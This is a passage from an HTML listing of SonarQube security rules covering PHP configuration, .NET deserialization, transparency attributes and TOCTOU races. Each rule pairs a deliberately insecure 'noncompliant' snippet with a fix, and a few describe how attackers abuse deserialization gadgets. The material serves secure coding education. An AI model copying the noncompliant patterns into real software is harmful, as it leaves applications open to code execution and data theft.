<pre data-diff-id="1" data-diff-type="noncompliant">
; php.ini
open_basedir="/:${USER}/scripts/data"  ; Noncompliant; root directory in the list
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
; php.ini
; open_basedir= ; Noncompliant; setting commented out
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
; php.ini
open_basedir="${USER}/scripts/data"
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
; php.ini try 1
open_basedir="/var/www/myapp/data"
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/23">CWE-23 - Relative Path Traversal</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/36">CWE-36 - Absolute Path Traversal</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5773">
              vbnet:S5773
            </a>
          </td>
          <td>
            <details>
              <p>Deserialization is the process of converting serialized data (such as objects or data structures) back into their original form. Types allowed to
be unserialized should be strictly controlled.</p>
<h2>Why is this an issue?</h2>
<p>During the deserialization process, the state of an object will be reconstructed from the serialized data stream. By allowing unrestricted
deserialization of types, the application makes it possible for attackers to use types with dangerous or otherwise sensitive behavior during the
deserialization process.</p>
<h3>What is the potential impact?</h3>
<p>When an application deserializes untrusted data without proper restrictions, an attacker can craft malicious serialized objects. Depending on the
affected objects and properties, the consequences can vary.</p>
<h3>Remote Code Execution</h3>
<p>If attackers can craft malicious serialized objects that contain executable code, this code will run within the application’s context, potentially
gaining full control over the system. This can lead to unauthorized access, data breaches, or even complete system compromise.</p>
<p>For example, a well-known attack vector consists in serializing an object of type <code><a
href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.-ctor?view=netframework-4.8#System_CodeDom_Compiler_TempFileCollection__ctor">TempFileCollection</a></code>
with arbitrary files (defined by an attacker) which will be deleted on the application deserializing this object (when the <a
href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.finalize?view=netframework-4.8">finalize()</a> method of
the TempFileCollection object is called). These kinds of specially crafted serialized objects are called "<a
href="https://github.com/pwntester/ysoserial.net">gadgets</a>".</p>
<h3>Privilege escalation</h3>
<p>Unrestricted deserialization can also enable attackers to escalate their privileges within the application. By manipulating the serialized data, an
attacker can modify object properties or bypass security checks, granting them elevated privileges that they should not have. This can result in
unauthorized access to sensitive data, unauthorized actions, or even administrative control over the application.</p>
<h3>Denial of Service</h3>
<p>In some cases, an attacker can abuse the deserialization process to cause a denial of service (DoS) condition. By providing specially crafted
serialized data, the attacker can trigger excessive resource consumption, leading to system instability or unresponsiveness. This can disrupt the
availability of the application, impacting its functionality and causing inconvenience to users.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter"><code>BinaryFormatter</code></a>,
<a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer"><code>NetDataContractSerializer</code></a>
or <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter"><code>SoapFormatter</code></a>:</p>
<pre data-diff-id="201" data-diff-type="noncompliant">
Dim myBinaryFormatter = New BinaryFormatter()
myBinaryFormatter.Deserialize(stream) ' Noncompliant
</pre>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer"><code>JavaScriptSerializer</code></a>:</p>
<pre data-diff-id="202" data-diff-type="noncompliant">
Dim serializer1 As JavaScriptSerializer = New JavaScriptSerializer(New SimpleTypeResolver()) ' Noncompliant: SimpleTypeResolver is insecure (every type is resolved)
serializer1.Deserialize(Of ExpectedType)(json)
</pre>
<h4>Compliant solution</h4>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter"><code>BinaryFormatter</code></a>,
<a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer"><code>NetDataContractSerializer</code></a>
or <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter"><code>SoapFormatter</code></a>:</p>
<pre data-diff-id="201" data-diff-type="compliant">
NotInheritable Class CustomBinder
    Inherits SerializationBinder
    Public Overrides Function BindToType(assemblyName As String, typeName As String) As Type
        If Not (Equals(typeName, "type1") OrElse Equals(typeName, "type2") OrElse Equals(typeName, "type3")) Then
            Throw New SerializationException("Only type1, type2 and type3 are allowed")
        End If
        Return Assembly.Load(assemblyName).[GetType](typeName)
    End Function
End Class

Dim myBinaryFormatter = New BinaryFormatter()
myBinaryFormatter.Binder = New CustomBinder()
myBinaryFormatter.Deserialize(stream)
</pre>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer"><code>JavaScriptSerializer</code></a>:</p>
<pre data-diff-id="202" data-diff-type="compliant">
Public Class CustomSafeTypeResolver
    Inherits JavaScriptTypeResolver
    Public Overrides Function ResolveType(id As String) As Type
        If Not Equals(id, "ExpectedType") Then
            Throw New ArgumentNullException("Only ExpectedType is allowed during deserialization")
        End If
        Return Type.[GetType](id)
    End Function
End Class

Dim serializer As JavaScriptSerializer = New JavaScriptSerializer(New CustomSafeTypeResolver())
serializer.Deserialize(Of ExpectedType)(json)
</pre>
<h3>Going the extra mile</h3>
<p>Instead of using <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter"><code>BinaryFormatter</code></a>
and similar serializers, it is recommended to use safer alternatives in most of the cases, such as <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer"><code>XmlSerializer</code></a> or <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer"><code>DataContractSerializer</code></a>.</p>
<p>If it’s not possible then try to mitigate the risk by restricting the types allowed to be deserialized:</p>
<ul>
  <li> by implementing an "allow-list" of types, but keep in mind that novel dangerous types are regularly discovered and this protection could be
  insufficient over time. </li>
  <li> or/and implementing a tamper protection, such as <a href="https://en.wikipedia.org/wiki/HMAC">message authentication codes</a> (MAC). This way
  only objects serialized with the correct MAC hash will be deserialized. </li>
</ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter">BinaryFormatter Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer">NetDataContractSerializer Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter">SoapFormatter Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer">JavaScriptSerializer Class</a> </li>
  <li> Microsoft Learn - <a href="https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer">XmlSerializer Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer">DataContractSerializer Class</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Microsoft Learn - <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?s=03">Deserialization
  risks in use of BinaryFormatter and related types</a> </li>
  <li> OWASP - <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md">Deserialization Cheat
  Sheet</a> </li>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/HMAC">Message Authentication Codes (MAC)</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/134">CWE-134 - Use of Externally-Controlled Format String</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5773">
              csharpsquid:S5773
            </a>
          </td>
          <td>
            <details>
              <p>Deserialization is the process of converting serialized data (such as objects or data structures) back into their original form. Types allowed to
be unserialized should be strictly controlled.</p>
<h2>Why is this an issue?</h2>
<p>During the deserialization process, the state of an object will be reconstructed from the serialized data stream. By allowing unrestricted
deserialization of types, the application makes it possible for attackers to use types with dangerous or otherwise sensitive behavior during the
deserialization process.</p>
<h3>What is the potential impact?</h3>
<p>When an application deserializes untrusted data without proper restrictions, an attacker can craft malicious serialized objects. Depending on the
affected objects and properties, the consequences can vary.</p>
<h3>Remote Code Execution</h3>
<p>If attackers can craft malicious serialized objects that contain executable code, this code will run within the application’s context, potentially
gaining full control over the system. This can lead to unauthorized access, data breaches, or even complete system compromise.</p>
<p>For example, a well-known attack vector consists in serializing an object of type <code><a
href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.-ctor?view=netframework-4.8#System_CodeDom_Compiler_TempFileCollection__ctor">TempFileCollection</a></code>
with arbitrary files (defined by an attacker) which will be deleted on the application deserializing this object (when the <a
href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.finalize?view=netframework-4.8">finalize()</a> method of
the TempFileCollection object is called). These kinds of specially crafted serialized objects are called "<a
href="https://github.com/pwntester/ysoserial.net">gadgets</a>".</p>
<h3>Privilege escalation</h3>
<p>Unrestricted deserialization can also enable attackers to escalate their privileges within the application. By manipulating the serialized data, an
attacker can modify object properties or bypass security checks, granting them elevated privileges that they should not have. This can result in
unauthorized access to sensitive data, unauthorized actions, or even administrative control over the application.</p>
<h3>Denial of Service</h3>
<p>In some cases, an attacker can abuse the deserialization process to cause a denial of service (DoS) condition. By providing specially crafted
serialized data, the attacker can trigger excessive resource consumption, leading to system instability or unresponsiveness. This can disrupt the
availability of the application, impacting its functionality and causing inconvenience to users.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter"><code>BinaryFormatter</code></a>,
<a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer"><code>NetDataContractSerializer</code></a>
or <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter"><code>SoapFormatter</code></a>:</p>
<pre data-diff-id="101" data-diff-type="noncompliant">
var myBinaryFormatter = new BinaryFormatter();
myBinaryFormatter.Deserialize(stream); // Noncompliant
</pre>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer"><code>JavaScriptSerializer</code></a>:</p>
<pre data-diff-id="102" data-diff-type="noncompliant">
JavaScriptSerializer serializer1 = new JavaScriptSerializer(new SimpleTypeResolver()); // Noncompliant
serializer1.Deserialize&lt;ExpectedType&gt;(json);
</pre>
<h4>Compliant solution</h4>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter"><code>BinaryFormatter</code></a>,
<a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer"><code>NetDataContractSerializer</code></a>
or <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter"><code>SoapFormatter</code></a>:</p>
<pre data-diff-id="101" data-diff-type="compliant">
sealed class CustomBinder : SerializationBinder
{
   public override Type BindToType(string assemblyName, string typeName)
   {
       if (!(typeName == "type1" || typeName == "type2" || typeName == "type3"))
       {
          throw new SerializationException("Only type1, type2 and type3 are allowed");
       }
       return Assembly.Load(assemblyName).GetType(typeName);
   }
}

var myBinaryFormatter = new BinaryFormatter();
myBinaryFormatter.Binder = new CustomBinder();
myBinaryFormatter.Deserialize(stream);
</pre>
<p>With <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer"><code>JavaScriptSerializer</code></a>:</p>
<pre data-diff-id="102" data-diff-type="compliant">
public class CustomSafeTypeResolver : JavaScriptTypeResolver
{
   public override Type ResolveType(string id)
   {
      if(id != "ExpectedType") {
         throw new ArgumentNullException("Only ExpectedType is allowed during deserialization");
      }
      return Type.GetType(id);
   }
}

JavaScriptSerializer serializer = new JavaScriptSerializer(new CustomSafeTypeResolver());
serializer.Deserialize&lt;ExpectedType&gt;(json);
</pre>
<h3>Going the extra mile</h3>
<p>Instead of using <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter"><code>BinaryFormatter</code></a>
and similar serializers, it is recommended to use safer alternatives in most of the cases, such as <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer"><code>XmlSerializer</code></a> or <a
href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer"><code>DataContractSerializer</code></a>.</p>
<p>If it’s not possible then try to mitigate the risk by restricting the types allowed to be deserialized:</p>
<ul>
  <li> by implementing an "allow-list" of types, but keep in mind that novel dangerous types are regularly discovered and this protection could be
  insufficient over time. </li>
  <li> or/and implementing a tamper protection, such as <a href="https://en.wikipedia.org/wiki/HMAC">message authentication codes</a> (MAC). This way
  only objects serialized with the correct MAC hash will be deserialized. </li>
</ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter">BinaryFormatter Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer">NetDataContractSerializer Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter">SoapFormatter Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer">JavaScriptSerializer Class</a> </li>
  <li> Microsoft Learn - <a href="https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer">XmlSerializer Class</a> </li>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer">DataContractSerializer Class</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Microsoft Learn - <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?s=03">Deserialization
  risks in use of BinaryFormatter and related types</a> </li>
  <li> OWASP - <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md">Deserialization Cheat
  Sheet</a> </li>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/HMAC">Message Authentication Codes (MAC)</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/134">CWE-134 - Use of Externally-Controlled Format String</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4211">
              csharpsquid:S4211
            </a>
          </td>
          <td>
            <details>
              <p>Transparency attributes in the .NET Framework, designed to protect security-critical operations, can lead to ambiguities and vulnerabilities when
declared at different levels such as both for the class and a method.</p>
<h2>Why is this an issue?</h2>
<p>Transparency attributes can be declared at several levels. If two different attributes are declared at two different levels, the attribute that
prevails is the one in the highest level. For example, you can declare that a class is <code>SecuritySafeCritical</code> and that a method of this
class is <code>SecurityCritical</code>. In this case, the method will be <code>SecuritySafeCritical</code> and the <code>SecurityCritical</code>
attribute attached to it is ignored.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Elevation of Privileges</h4>
<p>An attacker could potentially exploit conflicting transparency attributes to perform actions with higher privileges than intended.</p>
<h4>Data Exposure</h4>
<p>If a member with conflicting attributes is involved in handling sensitive data, an attacker could exploit the vulnerability to gain unauthorized
access to this data. This could lead to breaches of confidentiality and potential data loss.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System;
using System.Security;

namespace MyLibrary
{
    [SecuritySafeCritical]
    public class Foo
    {
        [SecurityCritical] // Noncompliant
        public void Bar()
        {
        }
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System;
using System.Security;

namespace MyLibrary
{
    public class Foo
    {
        [SecurityCritical]
        public void Bar()
        {
        }
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Never set class-level annotations</h4>
<p>A class should never have class-level annotations if some functions have different permission levels. Instead, make sure every function has its own
correct annotation.</p>
<p>If no function needs a particularly distinct security annotation in a class, just set a class-level <code>[SecurityCritical]</code>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Redgate Hub - <a
  href="https://www.red-gate.com/simple-talk/development/dotnet-development/whats-new-in-code-access-security-in-net-framework-4-0-part-i/">What’s New
  in Code Access Security in .NET Framework 4.0 – Part I</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5847">
              objc:S5847
            </a>
          </td>
          <td>
            <details>
              <p>When an application manipulates files, "Time-Of-Check to Time-Of-Use" can occur when a file-checking operation is disconnected from the actual
operation it is bound to.</p>
<p>For example, such a vulnerability occurs when a file existence check is performed strictly before a file creation operation.</p>
<h2>Why is this an issue?</h2>
<p>Race conditions can happen when file operations and their associated pre-checks are disconnected. Indeed, while the application assumes that the
checked file property will not change before performing the operation, there is a chance that changes are applied to the file.</p>
<p>Especially, a concurrent process, which an attacker can control, could modify a file right after a check is performed and before the actual use.
This file can be deleted, created, altered, or see its permissions changed depending on the use case.</p>
<h3>What is the potential impact?</h3>
<p>The impact of a successfully exploited race condition is dependent on the business logic of the vulnerable application. The consequences will vary
depending on what check is performed and how the file is used.</p>
<p>In general, attackers use such attacks to escalate privileges, execute arbitrary code, or perform a denial of service.</p>
<h4>Arbitrary code execution</h4>
<p>Executable or script file integrity and authenticity checks can be bypassed when exploiting a TOCTOU vulnerability. In such a scenario, attackers
would change an executable file content between when its integrity is checked and when the application executes it.</p>
<p>This attack would allow attackers to trick the application into executing malicious, arbitrary code. They would then be granted the same privilege
levels as the application itself, which can be particularly severe when it runs with administration privileges.</p>
<h4>Privileges escalation</h4>
<p>When the attacker is a local user on the same server as the running application, the same attack is possible with extended probability. In such a
case, attackers can exploit the reading and writing to configuration files, the creation of local network resources, or the use of temporary files to
achieve the same code execution purpose.</p>
<p>However, in that case, the attack is only meaningful when the application is running with high or otherwise interesting privileges. Attackers
exploiting a TOCTOU vulnerability that way would achieve horizontal or vertical privilege escalation.</p>
<h4>Denial of service</h4>
<p>When the application expects some file properties to be set at the operation time, it will often face unexpected errors when those properties have
actually changed. This might be the case when writing to a file where newly set permissions forbid that operation or when reading from a deleted
file.</p>
<p>When such errors are faced, the application might unexpectedly stop, which can affect its availability. Depending on the application and hosting
architectures, the interruption can be temporary or permanent, partial or complete.</p>
<h2>How to fix it</h2>
<p>To prevent TOCTOU race condition issues, best practices recommend relying on file operations that can perform the necessary preliminary checks
atomically. For example, file opening functions usually accept a parameter to check the file exists and return an error depending on the result. This
check is atomic and is not susceptible to race conditions.</p>
<p>When this is not possible, it might be possible to open a file directly, and to keep a reference to it for later use. If the conditions are set for
the subsequent operations, the application can continue with its processing and use the open file pointer to read or write to the file. In the
opposite case, an error might be raised that will need to be properly handled.</p>
<p>To finish, for most complex operations, the application can create a dedicated working directory and set tight permissions on it. This needs to be
performed atomically to prevent further race conditions. All subsequent sensitive file operations can then be performed in this dedicated
directory.</p>
<p>Note that this last solution is imperfect and is still susceptible to race condition attacks from privileged users and the application itself. It
should be used when no other countermeasure is acceptable.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following code sample is susceptible to a race condition attack because it checks a file exists strictly before it opens it for writing.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
FILE *fopen_if_not_exists(const char *file) {
  if (access(file, F_OK) == -1 &amp;&amp; errno == ENOENT) {
    FILE *f = fopen(file, "w"); // Noncompliant

    return f;
  }

  return nullptr;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FILE *fopen_if_not_exists(const char *file) {
  FILE *f = fopen(file, "wx");
  return f;
}
</pre>
<h3>How does this work?</h3>
<p>Here, the compliant code example uses an atomic operation to open the file and check for its existence beforehand.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Carnegie Mellon University Software Engineering Institure - <a
  href="https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files">FIO45-C. - Avoid TOCTOU race
  conditions while accessing files</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/367">CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3336">
              php:S3336
            </a>
          </td>
          <td>
            <details>
              <p>PHP session tokens are normally transmitted through HTTP cookies. However, for clients that do not support cookies and when the PHP
<code>session.use_trans_sid</code> setting is enabled, those tokens can be transmitted as URL parameters.</p>
<h2>Why is this an issue?</h2>
<p>GET URL parameter can be disclosed in a variety of ways:</p>
<ul>
  <li> Directly in a web browser address bar. </li>
  <li> In navigation history. </li>
  <li> In web servers or intermediate proxies log files. </li>
</ul>
<h3>What is the potential impact?</h3>
<p>Attackers with access to any of those disclosure locations will be able to see and steal a victim’s session token. They can then use it to log in
as the user, impersonate their account, and take advantage of their privileges.</p>
<p>Such an attack can be more or less severe depending on the victim’s privileges. Common security impacts range from data theft to application
takeover.</p>
<h4>Data theft</h4>
<p>Attackers with access to a compromised account will be able to disclose any information stored on it. This includes the Personally Identifiable
Information (PII) of the user.</p>
<p>The confidentiality of PII is a requirement from national security regulatory authorities in most countries. Insufficiently protecting this data
could have legal consequences and lead to fines or other prosecutions.</p>
<h4>Application takeover</h4>
<p>Attackers compromise the account of a high-privileged user could modify internal web application logic, disrupt workflows, or change other
application’s settings in a way that will give them full control over it.</p>
<p>Such an attack would lead to reputational damages and financial and legal consequences.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
; php.ini
session.use_trans_sid=1  ; Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
; php.ini
session.use_trans_sid=0
</pre>
<h3>How does this work?</h3>
<p>The compliant code example disables the <code>session.use_trans_sid</code> setting.</p>
<p>Note that this parameter is off by default.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3337">
              php:S3337
            </a>
          </td>
          <td>
            <details>
              <p>The <code>enable_dl</code> PHP configuration setting allows PHP extensions to be loaded dynamically at runtime.</p>
<h2>Why is this an issue?</h2>
<p>When dynamic loading is enabled, PHP code can load arbitrary PHP extensions by calling the <code>dl</code> function. This can be used to bypass
restrictions set with the <code>open_basedir</code> configuration.</p>
<p>PHP defaults to allowing dynamic loading.</p>
<h2>How to fix it</h2>
<p><code>enable_dl</code> setting should be set to <code>0</code> in the main PHP configuration.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
; php.ini
enable_dl=1  ; Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
; php.ini
enable_dl=0
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3334">
              php:S3334
            </a>
          </td>
          <td>
            <details>
              <p>File access functions in PHP are typically used to open local files. They are also capable of reading files from remote servers using protocols
such as HTTP, HTTPS and FTP.</p>
<p>This behavior is controlled by the <code>allow_url_fopen</code> and <code>allow_url_include</code> settings.</p>
<h2>Why is this an issue?</h2>
<p>Most applications do not require or expect the file access functions to download remotely accessible files. However, attackers can abuse these
remote file access features while exploiting other vulnerabilities, such as path traversal issues.</p>
<h3>What is the potential impact?</h3>
<p>While activating these settings does not pose a direct threat to the application’s security, they can make the exploitation of other
vulnerabilities easier and more severe.</p>
<p>If an attacker can control a file location while <code>allow_url_fopen</code> is set to <code>1</code>, they can use this ability to perform a
Server-Side Request Forgery exploit. This allows the attacker to affect more than just the local application and they may be able to laterally attack
other assets on the local network.</p>
<p>If <code>allow_url_include</code> is set to <code>1</code>, the attacker will also have the ability to download and execute arbitrary PHP code.</p>
<h2>How to fix it</h2>
<p><code>allow_url_fopen</code> and <code>allow_url_include</code> should be deactivated in the main PHP configuration file. Note that
<code>allow_url_include</code> is disabled by default while <code>allow_url_fopen</code> is not and must be explicitly disabled.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
; php.ini  Noncompliant; allow_url_fopen is enabled by default
allow_url_include=1  ; Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
; php.ini
allow_url_fopen=0
allow_url_include=0
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/829">CWE-16 - Inclusion of Functionality from Untrusted Control Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3335">
              php:S3335
            </a>
          </td>
          <td>
            <details>
              <p>The <code>cgi.force_redirect</code> <em>php.ini</em> configuration controls the behavior of the PHP engine when used in CGI mode. In particular, it
prevents CGI scripts from being directly requested without prior web server or application processing.</p>
<p>When disabled, CGI scripts can be requested directly.</p>
<h2>Why is this an issue?</h2>
<p>Pre-processing on the server side is often required to check users authentication when working in CGI mode. Those preliminary actions can also
position diverse configuration parameters necessary for the CGI script to work correctly.</p>
<h3>What is the potential impact?</h3>
<p>CGI scripts might behave unexpectedly if the proper configuration is not set up before they are accessed.</p>
<p>Most serious security-related consequences will affect the authorization and authentication mechanisms of the application. When the web server is
responsible for authenticating clients and forwarding the proper identity to the script, direct access will bypass this authentication step.</p>
<p>Attackers could also provide arbitrary identities to the CGI script by forging specific HTTP headers or parameters. They could then impersonate any
